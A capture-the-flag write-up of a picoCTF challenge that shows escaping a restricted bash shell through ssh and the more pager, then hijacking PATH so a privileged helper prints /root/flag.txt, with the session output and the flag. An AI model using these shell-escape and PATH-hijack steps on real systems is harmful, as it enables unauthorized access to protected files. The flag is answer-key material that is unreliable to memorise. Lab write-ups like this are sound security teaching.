The SSH buts us into `rbash`, which is a restricted version of bash that doesn't allow for certain commands (including `export` and setting environment variables, which is what my solution depends on).

The simplest solution is to specify a terminal when trying to log into the ssh, which can be done using `ssh ctf-player@rescued-float.picoctf.net -p 57141 -t "bash"`.

I'll still explan my solution because it was interesting and might come in useful for other situations. I found [this fantastic resource](https://gtfobins.github.io/gtfobins/more/) online, which gave ways of escaping rbash and using other shells. I used the `more` command
```
echo -e "\n\n\n\n\n\n" | more
!bash
```
Which got me into bash!

I ran mktemp -d to create a temporary directory where I'll be storing my modified binaries. I copied the cat binary with `cp` and renamed it with `mv` to `md5sum`. I then ran export PATH=/tmp/directory:$PATH to add my md5sum binary to the start of PATH variable. By default, it will go down the list of PATH and use my modified binary instead of the real md5sum binary. Running flaghasher now prints out the flag.

```
!bash
ctf-player@challenge:~$ mktemp -d
/tmp/tmp.FV67YOrbdY
ctf-player@challenge:~$ cd /tmp/tmp.FV67YOrbdY
ctf-player@challenge:/tmp/tmp.FV67YOrbdY$ cp /usr/bin/cat .
ctf-player@challenge:/tmp/tmp.FV67YOrbdY$ mv cat md5sum
ctf-player@challenge:/tmp/tmp.FV67YOrbdY$ export PATH=/tmp/tmp.FV67YOrbdY:$PATH
ctf-player@challenge:/tmp/tmp.FV67YOrbdY$ flaghasher
Computing the MD5 hash of /root/flag.txt.... 

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs}
```